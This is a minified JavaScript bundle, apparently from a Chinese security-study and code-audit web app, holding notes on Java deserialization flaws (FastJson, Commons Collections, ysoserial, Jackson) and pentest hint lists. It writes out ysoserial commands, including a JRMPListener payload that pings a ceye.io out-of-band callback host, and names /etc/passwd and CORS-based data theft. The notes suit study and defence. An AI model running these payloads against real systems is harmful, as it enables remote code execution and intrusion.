                      1\u3001\u5176\u5B9E\u5728Java\u4E2D\u5B9A\u4E49\u7684\u4E00\u4E2A\u7C7B\u672C\u8EAB\u4E5F\u662F\u4E00\u4E2A\u5BF9\u8C61\uFF0C\u5373java.lang.Class\u7C7B\u7684\u5B9E\u4F8B\uFF0C\u8FD9\u4E2A\u5B9E\u4F8B\u79F0\u4E3A\u7C7B\u5BF9\u8C61
                          1\u3001\u7C7B\u5BF9\u8C61\u8868\u793A\u6B63\u5728\u8FD0\u884C\u7684 Java \u5E94\u7528\u7A0B\u5E8F\u4E2D\u7684\u7C7B\u548C\u63A5\u53E3
                          2\u3001\u7C7B\u5BF9\u8C61\u6CA1\u6709\u516C\u5171\u6784\u9020\u65B9\u6CD5\uFF0C\u7531 Java \u865A\u62DF\u673A\u81EA\u52A8\u6784\u9020
                          3\u3001\u7C7B\u5BF9\u8C61\u7528\u4E8E\u63D0\u4F9B\u7C7B\u672C\u8EAB\u7684\u4FE1\u606F\uFF0C\u6BD4\u5982\u6709\u51E0\u79CD\u6784\u9020\u65B9\u6CD5\uFF0C \u6709\u591A\u5C11\u5C5E\u6027\uFF0C\u6709\u54EA\u4E9B\u666E\u901A\u65B9\u6CD5


  `),Object(u.c)("FastJson",`

  FastJson\u6846\u67B6\uFF0C\u7B80\u4ECB\uFF1A
          1\u3001fastjson.jar \u662F\u963F\u91CC\u5F00\u53D1\u7684\u4E00\u6B3E\u4E13\u95E8\u7528\u4E8EJava\u5F00\u53D1\u7684\u5305
                  \u9664\u4E86\u8FD9\u4E2Afastjson\u4EE5\u5916\uFF0C\u8FD8\u6709Google\u5F00\u53D1\u7684Gson\u5305\u3001\u7B2C\u4E09\u65B9\u7684JackSon\u5305\u3002
                  \u5176\u4ED6\u5F62\u5F0F\u7684\u5982net.sf.json\u5305\uFF0C
                  \u90FD\u53EF\u4EE5\u5B9E\u73B0json\u7684\u8F6C\u6362\u3002\u65B9\u6CD5\u540D\u79F0\u4E0D\u540C\u800C\u5DF2\uFF0C\u6700\u540E\u7684\u5B9E\u73B0\u7ED3\u679C\u90FD\u662F\u4E00\u6837\u7684\u3002
          2\u3001fastjson\u7528\u4E8E\u5C06 Java Bean \u5E8F\u5217\u5316\u4E3A JSON\u5B57\u7B26\u4E32 \uFF0C\u4E5F\u53EF\u4EE5\u4ECE JSON\u5B57\u7B26\u4E32 \u53CD\u5E8F\u5217\u5316\u5230 JavaBean \u3002

  \u300AFastJson\u6F0F\u6D1E\u300B\u7B80\u7B54\uFF1A
          JdbcRowSetImpl\uFF0CTemplatesImpl\uFF0CBasicDataSource\uFF0CMySql Connector\u7B49\uFF0C
                  \u6BD4\u5982\uFF1A
                      1\u3001JdbcRowSetImpl \u7684 setAutoCommit \u5982\u4F55\u89E6\u53D1\u5230lookup\uFF0C
                      2\u3001lookup\u5E95\u5C42\u600E\u6837\u5B9E\u4F8B\u5316remoteObject\u3002
                      3\u3001BasicDataSource\u7684\u4E24\u79CD\u60C5\u51B5\uFF0C
                      4\u3001toString\u89E6\u53D1\u70B9
                      5\u3001\u548C\u9AD8\u7248\u672Cfastjson\u7684$ref\u7279\u6027\uFF0C
                      6\u3001\u4EE5\u53CA\u8DDF\u5165\u540EBCELClassLoader\u7684\u95EE\u9898

  1. \u53C2\u8003\u8D44\u6599\uFF1A
      \u9AD8\u4EF7\u503C\uFF1A
              \u5168\u96C6\uFF1Ahttps://www.cnblogs.com/yiaho/p/fastjson.html
              1.2.80\u7248\u672C\uFF1A
                      https://y4er.com/posts/fastjson-1.2.80/

      \u4E2D\u4EF7\u503C\uFF1A
              https://xz.aliyun.com/t/7027
              \u4E00\u4E9B\u9ED1\u540D\u5355\u7ED5\u8FC7\uFF1Ahttps://www.freebuf.com/vuls/276812.html

      1\u3001\u8BE6\u7EC6\u5386\u53F2\uFF1A
              https://paper.seebug.org/1192/#fastjson
      2\u3001\u5176\u5B83\u6587\u7AE0\uFF1A

              https://tttang.com/archive/1579/#toc_1268


`,{otherCps:v.a.createElement(v.a.Fragment,null,H)}),Object(u.c)("cc\u94FE________CommonsCollections________Apache Commons Collections",`

    \u53C2\u8003\u8D44\u6599\uFF1A
            \u9AD8\u4EF7\u503C\uFF1A
                    \u8BF4\u7684\u591F\u8BE6\u7EC6\uFF1Ahttps://xz.aliyun.com/t/9409#toc-6
                    \u5E26\u56FE\uFF1Ahttp://moonflower.fun/index.php/2022/02/23/287/

    \u7B80\u7B54\uFF1A
            1\u3001\u56DB\u4E2Atransformer\u7684\u4F5C\u7528\uFF0C
            2\u3001TemplatesImpl\uFF0CPriority Queue\uFF0CTiedMapEntry\uFF0CHashMap \u548C HashTable\uFF0C
            3\u3001\u5305\u62EC\u957F\u4EAD\u5E08\u5085\u7684k1-k4\uFF0C\u56F4\u7ED5\u8FD9\u4E9B\u6765\u8C08\uFF0C\u5176\u5B9E\u90FD\u662F\u6362\u6C64\u4E0D\u6362\u836F\u3002
            4\u3001readObject\u8DDF\u4E0B\u53BB\uFF0C
            5\u3001\u627E LazyMap.get \u89E6\u53D1transform\u65B9\u6CD5\uFF0C
                    \u7531\u4E8E\u591A\u6001\uFF0CLazyMap\u672C\u8D28\u662Fmap\uFF0C\u627E\u5230map.get\u8FD9\u6837\u6BD4\u8F83\u5E38\u89C4\u7684\u64CD\u4F5C\u5373\u53EF

    Commons\u5E93\u3001CC\uFF0C\u7B80\u4ECB\uFF1A
            1\u3001\u300AApache Commons\u300B\uFF0C\u662FApache\u7684\u5DE5\u5177\u5E93\uFF0C\u63D0\u4F9B\u4E86\u5F88\u591A JDK \u7684\u62D3\u5C55\u65B9\u6CD5\u5E93
                    1\u3001\u5305\u542B\u4E86\u5F88\u591A\u5F00\u6E90\u7684\u5DE5\u5177\uFF0C\u7528\u4E8E\u89E3\u51B3\u5E73\u65F6\u7F16\u7A0B\u7ECF\u5E38\u4F1A\u9047\u5230\u7684\u95EE\u9898\u3002
            2\u3001Apache Commons \u5F53\u4E2D\u6709\u4E00\u4E2A\u7EC4\u4EF6\u53EB\u505A Apache Commons Collections\uFF0C\u7B80\u79F0CC\u3002
                    1\u3001\u5C01\u88C5\u4E86 Java \u7684 Collection\u96C6\u5408 \u76F8\u5173\u7C7B\u5BF9\u8C61\u3002


    DualHashBidiMap
        \u9996\u5148\u6765\u770B\u770B\u662F\u5982\u4F55\u4F7F\u7528DualHashBidiMap\u7C7B\u6765\u6784\u9020\u65B0\u5229\u7528\u94FE\u7684
        \u63A5\u4E0B\u6765\u5206\u6790\u4F7F\u7528DualTreeBidiMap\u7C7B\u6765\u6784\u9020\u65B0\u5229\u7528\u94FE\uFF0C\u8FD9\u6761\u94FE\u9700\u8981\u5728Commons Collections 4.0\u7248\u672C\u4E0B\u5229\u7528\uFF0C\u539F\u56E0\u4F1A\u5728\u540E\u9762\u8BF4\u660E

    DualLinkedHashBidiMap
        \u5728\u5206\u6790DualTreeBidiMap\u7684\u8FC7\u7A0B\u4E2D\uFF0C\u53D1\u73B0Commons Collections 4.0\u7248\u672C\u4E2D\u65B0\u589E\u4E86\u4E00\u4E2A\u7C7B
            org.apache.commons.collections4.bidimap.DualLinkedHashBidiMap



  `,{otherCps:v.a.createElement(v.a.Fragment,null,cu)}),Object(u.c)("\u53CD\u5E8F\u5217\u5316\u5DE5\u5177____YsoSerial________\u7ECF\u5E38\u7528\u4E8ECC\u94FE\u7684\u5229\u7528\u548C\u6784\u9020\uFF01\uFF01",`

  \u300AYsoSerial\u300B

      \u8D44\u6599\uFF1A
              \u8BB2\u7684\u6BD4\u8F83\u77ED\uFF1Ahttps://johnfrod.top/%E5%B7%A5%E5%85%B7/ysoserial-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E8%B0%83%E8%AF%95%E6%95%99%E7%A8%8B/

              \u6CA1\u770B\u5B8C\uFF1A
                      \u57FA\u4E8E Groovy-1 \u94FE\uFF0C\u6765\u8BB2\u89E3YsoSerial\uFF1Ahttps://www.anquanke.com/post/id/202730


      \u4ECB\u7ECD\uFF1A
              1\u3001\u8BDE\u751F\u4E8E2015\u5E74\uFF0C\u6700\u65E9\u7528\u4E8ECC\u94FE\u3002\u5F00\u521B\u4E86 Java\u53CD\u5E8F\u5217\u5316 \u8FD9\u7247\u9886\u57DF\u3002
              2\u3001YsoSerial\u5DE5\u5177\uFF0C\u662F\u5728\u5E38\u89C1\u7684Java\u5E93\u4E2D\u53D1\u73B0\u7684\u5B9E\u7528\u7A0B\u5E8F\u548C\u9762\u5411\u5C5E\u6027\u7684\u7F16\u7A0B  Gadget\uFF08\u5C0F\u5DE5\u5177\uFF09\u94FE  \u7684\u96C6\u5408\u3002
                      1\u3001\u5B83\u4EEC\u53EF\u4EE5\u5728\u9002\u5F53\u7684\u6761\u4EF6\u4E0B\u5229\u7528Java\u5E94\u7528\u7A0B\u5E8F\u6267\u884C\u4E0D\u5B89\u5168\u7684\u5BF9\u8C61\u53CD\u5E8F\u5217\u5316
              3\u3001\u7528\u4E8E\u751F\u6210\u5229\u7528 \u300A\u4E0D\u5B89\u5168\u7684Java\u5BF9\u8C61\u53CD\u5E8F\u5217\u5316\u300B \u7684 payload \u7684 PoC\uFF08\u6982\u5FF5\u9A8C\u8BC1\uFF09 \u7684\u5DE5\u5177\u3002
                      1\u3001\u5373\uFF0C \u5FEB\u901F\u751F\u6210  Java\u53CD\u5E8F\u5217\u5316payload  \u3002
              4\u3001\u5F00\u6E90\u4ED3\u5E93\uFF0C\u5730\u5740\uFF1A
                      https://github.com/frohoff/ysoserial
              5\u3001\u6700\u7B80\u5355\u7684\u7406\u89E3\u4F7F\u7528\u7528\u6CD5\uFF1A
                      1\u3001\u7C7B\u4F3C\u4E8E  python  xxx.py  <\u53C2\u6570\u4E00>  <\u53C2\u6570\u4E8C>  \uFF0C\u8FD9\u6837\u7684\u4F7F\u7528\u3002

      \u5B89\u88C5\u65B9\u5F0F\uFF1A
              1\u3001\u7B2C\u4E00\u79CD\uFF0C\u76F4\u63A5\u4E0B\u8F7D\uFF0C\u73B0\u6210\u7684Jar\u5305\uFF1A
                      \u4ECE\u6E90\u7801\u4ED3\u5E93\u7684release\u4E2D\uFF0C\u5373\u53EF\u627E\u5230\u3002
              2\u3001\u7B2C\u4E8C\u79CD\uFF0C\u662F\u4E0B\u8F7D\u6E90\u7801\u540E\u7F16\u8BD1\u751F\u6210 jar \u5305\u4F7F\u7528\u3002
                      \u6BD4\u5982\uFF1A
                              mvn clean package -DskipTests


      \u5305\u542B\u4E86\u591A\u4E2A payload \u548C Gadget\uFF08\u5C0F\u5DE5\u5177\uFF09 \uFF1A
              1\u3001\u300ACC1\u300B \u2014\u2014 \u300ACC7\u300B
              2\u3001\u300AGroovy-1\u300B


      \u4F7F\u7528\uFF1A
              1\u3001Payload\u67E5\u770B\uFF1A
                      1\u3001\u901A\u8FC7\u4EE5\u4E0B\u7684\u547D\u4EE4\u80FD\u591F\u770B\u5230 ysoserial \u7684 payloads:
                              java -jar ysoserial.jar

              2\u3001ysoserial \u4E3B\u8981\u6709\u4E24\u79CD\u4F7F\u7528\u65B9\u5F0F\uFF0C
                      1\u3001YsoSerial \u4E3B\u8981\u6709\u4E24\u79CD\u4F7F\u7528\u65B9\u5F0F\uFF0C\u7B2C\u4E00\u79CD\u662F\u8FD0\u884Cysoserial.jar \u4E2D\u7684\u4E3B\u7C7B\u51FD\u6570\uFF0C\u53E6\u4E00\u79CD\u662F\u8FD0\u884Cysoserial\u4E2D\u7684exploit \u7C7B\uFF0C
                              1\u3001\u4E8C\u8005\u7684\u6548\u679C\u662F\u4E0D\u4E00\u6837\u7684\uFF0C\u4E00\u822C\u7528\u7B2C\u4E8C\u79CD\u65B9\u5F0F\u5F00\u542F \u4EA4\u4E92\u670D\u52A1 \uFF08\u5982WebShell\uFF09\u3002
                      2\u3001\u7B2C\u4E00\u79CD\uFF0C\u4E3B\u7C7B\u51FD\u6570\uFF1A
                              java -jar ysoserial-0.0.6-SNAPSHOT-all.jar <payload>    '<command>'
                              java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS       http://xx.xxxxx.ceye.io
                      3\u3001\u7B2C\u4E8C\u79CD\uFF0C\u5404\u79CDExploit\u7C7B\uFF1A
                              \u4ECB\u7ECD\uFF1A
                                      1\u3001\uFF08\u4E00\u822C\uFF0C\u4EE5 \u300Aysoserial.exploit.xxx\u300B \u7684\u7C7B\u540D\uFF0C\u4F5C\u4E3A\u7B2C\u4E8C\u4E2A\u53C2\u6570\uFF0C\u8FDB\u884C\u4F20\u5165\uFF09
                                      2\u3001\u5C31\u548C \u300Apython  xxx.py  <\u53C2\u6570\u4E00>  <\u53C2\u6570\u4E8C>  \u300B\u7684\u65B9\u5F0F\u5DEE\u4E0D\u591A\u3002
                              java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar  ysoserial.exploit.JRMPListener  <port>  CommonsCollections1  '<commands>'
                                      port\uFF1A\u516C\u7F51vps\u4E0A\u76D1\u542C\u7684\u7AEF\u53E3\u53F7
                                      commands\uFF1A\u9700\u8981\u6267\u884C\u7684\u547D\u4EE4
                              java -cp ysoserial-0.0.6-SNAPSHOT-all.jar       ysoserial.exploit.JRMPListener  2333    CommonsCollections1  'ping -c 2  rce.267hqw.ceye.io'


  `),Object(u.c)("JackSon",`
  JackSon
      \u8D44\u6599\uFF1A
              \u6F0F\u6D1E\u901A\u544A\uFF1A
                      https://www.h3c.com/cn/d_202112/1519639_30003_0.htm
                      https://www.yisu.com/zixun/576271.html
              \u9AD8\u4EF7\u503C\uFF1A
                      https://blog.cfyqy.com/article/64cb820c.html
              \u4E2D\u9AD8\u4EF7\u503C\uFF1A
                      \u4E24\u4E2A\u6F0F\u6D1E\uFF1Ahttps://xz.aliyun.com/t/9331
                      \u5982\u4F55\u6839\u636E\u901A\u544A\uFF0C\u53D1\u73B0\u6F0F\u6D1E\uFF1Ahttps://www.anquanke.com/post/id/227943
                      \u5BF9 \u300ACVE-2017-7525\u300B \u548C \u300ACVE-2020-24616\u300B \u7684\u8BE6\u7EC6\u5206\u6790\uFF1Ahttps://segmentfault.com/a/1190000039713822
              \u4F4E\u4EF7\u503C\uFF1A
                      \u590D\u73B0\u6D41\u7A0B\uFF0C\u65E0\u539F\u7406\uFF1Ahttps://www.jrasp.com/case/CVE-2020-35728.html

      \u4ECB\u7ECD\uFF1A
              1\u3001FasterXML Jackson\u662F\u7F8E\u56FDFasterXML\u516C\u53F8\u7684\u4E00\u6B3E\u9002\u7528\u4E8EJava\u7684\u6570\u636E\u5904\u7406\u5DE5\u5177\u3002
                      jackson-databind\u662F\u5176\u4E2D\u7684\u4E00\u4E2A\u5177\u6709\u6570\u636E\u7ED1\u5B9A\u529F\u80FD\u7684\u6838\u5FC3\u7EC4\u4EF6\u4E4B\u4E00\u3002
              1\u3001jackson\u6838\u5FC3\u6A21\u5757\u7531\u4E09\u90E8\u5206\u6784\u6210\uFF1A
                      1\u3001jackson-core - \u6838\u5FC3\u5305\uFF0C\u63D0\u4F9B\u57FA\u4E8E\u6D41\u6A21\u5F0FAPI
                      2\u3001jackson-annotations - \u6CE8\u89E3\u5305\uFF0C\u63D0\u4F9B\u6807\u51C6\u6CE8\u89E3\u529F\u80FD
                      3\u3001jackson-databind - \u6570\u636E\u7ED1\u5B9A\u5305\uFF0C \u63D0\u4F9B\u57FA\u4E8E \u201D\u5BF9\u8C61\u7ED1\u5B9A\u201D \u89E3\u6790\u7684\u76F8\u5173 API \uFF08 ObjectMapper \uFF09\u3001\u548C \u201D\u6811\u6A21\u578B\u201D \u89E3\u6790\u7684\u76F8\u5173 API

  `,{otherCps:v.a.createElement(v.a.Fragment,null,_u)}))])},Hu=Object(D.a)(Object.values(Au).sort(function(f,j){return-1*(f.sort-j.sort)}).map(function(f){return f.value}).flat(1)),wu=p.a._\u7EDF\u4E00\u8FDB\u884C\u63D0\u53D6____\u6839\u636E\u65B9\u6846\u6B63\u5219____\u62FF\u5230\u5FC5\u8981\u7684\u6240\u6709\u8D44\u6599\u540E(Hu),Zu=wu._\u6B63\u5219\u5173\u952E\u5B57_BeanMap,o=wu._\u6B63\u5219\u5173\u952E\u5B57_\u5B57\u7B26\u4E32Arr,M=(L=Object(s.a)(),L(W=(X=N=function f(){Object(O.a)(this,f)},N._\u6B63\u5219\u5173\u952E\u5B57_BeanMap=Zu,N._\u6B63\u5219\u5173\u952E\u5B57_\u5B57\u7B26\u4E32Arr=o,X))||W),y=function(){return v.a.createElement(S.a,{cfgType:"\u81EA\u52A8\u5B57\u7B26\u4E32\u65B9\u5F0F",\u81EA\u52A8Helper_instance:M,selectTimes\u5404\u9879\u9009\u4E2D\u6B21\u6570_\u542B\u72EC\u4E00\u65E0\u4E8CID_cfg:{cp_key____\u89C6\u4E3A\u72EC\u4E00\u65E0\u4E8CKey:"\u4EE3\u7801\u5BA1\u8BA1_\u9762\u8BD5\u8F85\u52A9_\u81EA\u52A8____\u5BF9\u4E8E_\u5B8C\u7F8E_\u7A33\u6001_\u7684\u6301\u7EED\u63A2\u7D22____\u7591\u96BE\u6742\u75C7_\u641C\u7D22"},showHeaders:!1,additionDescription:v.a.createElement("h1",null,"\u4EE3\u7801\u5BA1\u8BA1-\u8F85\u52A9"),defaultOption_arr:[]})};g.a=y},ixEG:function(P,g,F){"use strict";F.r(g);var O=F("eOgB");g.default=O.a},"jR+D":function(P,g,F){P.exports=F.p+"static/planet_fantasy_3.d532a2d0.png"},q4c3:function(P,g,F){"use strict";F.d(g,"a",function(){return v});var O=F("q1tI"),D=F.n(O),t=F("ysNt"),n=[{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u767B\u5F55\u3001\u6CE8\u518C",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:t.l.get_regex_fromArrKeywords(["\u767B\u5F55","\u767B\u9646","\u6CE8\u518C"]),desc:"\u767B\u5F55\u903B\u8F91",koans_\u63D0\u793A:["\u5E38\u89C1\uFF1A\u9A8C\u8BC1\u7801","\u5E38\u89C1\uFF1A\u4EFB\u610F\u6CE8\u518C","\u5E38\u89C1\uFF1A\u4EFB\u610F\u627E\u56DE","\u5E38\u89C1\uFF1A\u4EFB\u610F\u91CD\u7F6E","\u5E38\u89C1\uFF1A\u91CD\u5B9A\u5411","\u5E38\u89C1\uFF1A\u6B65\u9AA4\u8DF3\u8FC7","\u5E38\u89C1\uFF1A","\u5E38\u89C1\uFF1A\u2026\u2026\u2026\u2026"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u652F\u4ED8",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:t.l.get_regex_fromArrKeywords(["\u652F\u4ED8"]),desc:"\u652F\u4ED8\u903B\u8F91",koans_\u63D0\u793A:["\u5E38\u89C1\uFF1A0\u5143","\u5E38\u89C1\uFF1A\u8D1F\u6570","\u5E38\u89C1\uFF1A\u91CD\u653E","\u5E38\u89C1\uFF1A\u968F\u673A\u591A\u6B21\u63620.01\u5143","\u5E38\u89C1\uFF1A\u2026\u2026\u2026\u2026"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u91CD\u5B9A\u5411",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:t.l.get_regex_fromArrKeywords(["\u91CD\u5B9A\u5411","redirect","return","url"]),desc:"\u91CD\u5B9A\u5411\u903B\u8F91",koans_\u63D0\u793A:["\u5E38\u89C1\uFF1A\u6267\u884Cjs\u4EE3\u7801","\u5E38\u89C1\uFF1A\u8DF3\u8F6C\u5176\u5B83\u7F51\u7AD9","\u5E38\u89C1\uFF1A\u2026\u2026\u2026\u2026"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u63D0\u4EA4\u5404\u79CD\u4FE1\u606F",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:t.l.get_regex_fromArrKeywords(["\u8BC4\u8BBA","\u7559\u8A00","\u56DE\u590D","\u5E16","\u8868\u5355","\u63D0\u4EA4","\u7533\u8BF7","\u8D44\u6599","\u4FE1\u606F"]),desc:"\u63D0\u4EA4\u5404\u79CD\u4FE1\u606F",koans_\u63D0\u793A:["\u5E38\u89C1\uFF1AXSS","\u5E38\u89C1\uFF1ASQL\u6CE8\u5165","\u5E38\u89C1\uFF1A\u2026\u2026\u2026\u2026"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"CORS\u8DE8\u57DF",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:t.l.get_regex_fromArrKeywords(["cors","\u8DE8\u57DF","xss"]),desc:"CORS\u8DE8\u57DF",koans_\u63D0\u793A:["\u53EF\u4EE5\uFF0C\u8BBF\u95EE\u7A83\u53D6\u654F\u611F\u4FE1\u606F","\u5E38\u89C1\uFF1A\u548C\u3010XSS\u3011\u7EC4\u5408\u5728\u4E00\u8D77\uFF0C\u5F62\u6210\u3010\u7EC4\u5408\u62F3\u3011\uFF0C\u76F4\u63A5\u7A83\u53D6\u654F\u611F\u4FE1\u606F\uFF0C\u53EF\u88AB\u5B9A\u4E3A\u9AD8\u5371",D.a.createElement("div",null,"\u53C2\u8003\u8D44\u6599\uFF1A",D.a.createElement("ol",null,D.a.createElement("li",null,t.l.singleATag_blank("\u53CD\u5C04XSS\u548CCORS\u6F0F\u6D1E\u7684\u7EC4\u5408\u62F3\u5F15\u53D1\u7684\u8840\u6848 - InfoQ \u5199\u4F5C\u5E73\u53F0","https://xie.infoq.cn/article/b8089e408ffa63fbc5d46d2a5")))),D.a.createElement("div",null,"\u76F8\u5173\u5DE5\u5177\uFF1A",D.a.createElement("ol",null,D.a.createElement("li",null,"\u5F00\u6E90\u5DE5\u5177 CrossSiteContentHijacking\uFF0C\u7528\u4E8E\u9A8C\u8BC1 CORS\u6F0F\u6D1E"))),"\u5E38\u89C1\uFF1A\u2026\u2026\u2026\u2026"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:".idea\u3001.git\uFF0C\u4FE1\u606F\u6CC4\u9732",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:t.l.get_regex_fromArrKeywords([".idea","idea",".git","git"]),desc:".idea\u4FE1\u606F\u6CC4\u9732",koans_\u63D0\u793A:[D.a.createElement("div",null,"\u3010.idea\u3011\u6CC4\u9732\u6316\u6398",D.a.createElement("ol",null,D.a.createElement("li",null,"\u5DE5\u5177\u4ECB\u7ECD\uFF1A",t.l.singleATag_blank(".idea \u6587\u4EF6\u5939\u6CC4\u9732\u5229\u7528\u5DE5\u5177 | \u674E\u52BC\u6770\u7684\u535A\u5BA2","http://www.lijiejie.com/idea-exploit/")),D.a.createElement("li",null,"\u5DE5\u5177\u4E0B\u8F7D\uFF1A",t.l.singleATag_blank("lijiejie/idea_exploit: \u6536\u96C6\u5DE5\u5177","https://github.com/lijiejie/idea_exploit"))))]}],v=[{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u3010.bak\u3011",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/.*\.bak/g,desc:"\u4EFB\u610F\u3010.bak\u3011\u540E\u7F00\u6587\u4EF6",koans_\u63D0\u793A:[]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u63A5\u53E3",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/接口/g,desc:"\u4EFB\u610F\u63A5\u53E3\u5730\u5740",koans_\u63D0\u793A:[]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"/etc/passwd",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/\/etc\/passwd/g,desc:"\u3010/etc/passwd\u3011\uFF0C\u5BC6\u7801\u6587\u4EF6",koans_\u63D0\u793A:[]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"colorlib",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/colorlib/g,desc:"\u3010colorlib\u3011\uFF0C\u662F\u3010WordPress\u3011\u7684\u4E00\u4E2A\u76F8\u5173\u4E3B\u9898\u3002",koans_\u63D0\u793A:["\u68C0\u67E5\u3010WordPress\u3011"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"\u57DF",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/域/g,desc:"\u3010\u57DF\u3011\uFF0C\u7F51\u7EDC\u7ED3\u6784\u4E2D\u7684\u4E00\u79CD\uFF0C\u590D\u6742\u7684 \u7EC4\u7EC7\u7ED3\u6784 \u3002",koans_\u63D0\u793A:["\u4F7F\u7528\u3010BloodHound\u3011\u5BFB\u8840\u730E\u72AC"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"nmap",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/nmap/g,desc:"nmap\u626B\u63CF\uFF0C\u6709\u591A\u79CD\u65B9\u5F0F\uFF0CTCP\u3001UDP",koans_\u63D0\u793A:["nmap\u626B\u63CF\uFF0C\u4F7F\u7528TCP\u626B\u63CF\u540E\uFF0C\u5E94\u518D\u8FDB\u884C\u4E00\u6B21 \u3010UDP\u3011 \u626B\u63CF\u3002","	\u53EF\u80FD\u4F1A\u5F97\u5230\uFF0C\u622A\u7136\u4E0D\u540C\u7684\u7ED3\u679C"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:".action .do",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/(\.action|\.do)/g,desc:"\u6846\u67B6\u5E73\u53F0",koans_\u63D0\u793A:["Java\u8BED\u8A00","\u6846\u67B6\u5E73\u53F0\uFF0C\u53EF\u80FD\u662FWebLogic","\u3010.action\u3011\u7248\u672C\u6BD4\u8F83\u8001\u4E00\u70B9\uFF0C\u3010.do\u3011\u7248\u672C\u6BD4\u8F83\u65B0\u4E00\u70B9"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"names.nsf",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/names\.nsf/g,desc:"\u6846\u67B6\uFF0C\u8DEF\u7531\u63A7\u5236",koans_\u63D0\u793A:["\u7ECF\u5E38\u6709\u3010names.nsf?Login\u3011\u3001\u3010names.nsf?Logout\u3011\uFF0C\u8FD9\u6837\u7684\u3002","\u4F3C\u4E4E\u548C\u3010IBM Lotus Notes\u3011\u6709\u5173\uFF1B\u8FD9\u662F\u4E00\u4E2A IBM \u7684\u90AE\u4EF6\u5BA2\u6237\u7AEF\u3002"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:".ashx",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/\.ashx/g,desc:"\u6846\u67B6\u5E73\u53F0",koans_\u63D0\u793A:["\u6846\u67B6\u5E73\u53F0\uFF0C\u4E0D\u77E5\u9053\u662F\u4EC0\u4E48\u5E73\u53F0\uFF1F"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"FreeMarker",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/FreeMarker/g,desc:"JSX\u7684\u524D\u7AEF\u6A21\u677F\u6E32\u67D3",koans_\u63D0\u793A:["JSX\u7684\u524D\u7AEF\u6A21\u677F\u6E32\u67D3"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:".aspx",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/\.aspx/g,desc:"ASP\u548C.NET",koans_\u63D0\u793A:["ASP\u548C.NET"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"WEB-INF\u3001web.xml",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/(WEB-INF|web\.xml)/g,desc:"Apache\u670D\u52A1\u5668\u76F8\u5173\u6587\u4EF6",koans_\u63D0\u793A:["Apache\u670D\u52A1\u5668\uFF0C\u4E00\u4E9B\u63CF\u8FF0\u6027\u7684\u6587\u4EF6\u3001\u548C\u914D\u7F6E\u6587\u4EF6","\u5305\u62EC\u3010Servlet\u76F8\u5173\u3011"]},{name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:"ESAPI.properties",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:/(ESAPI|validation)(\.properties)?/g,desc:"ES\u76F8\u5173\u7684API\uFF08Enterprise 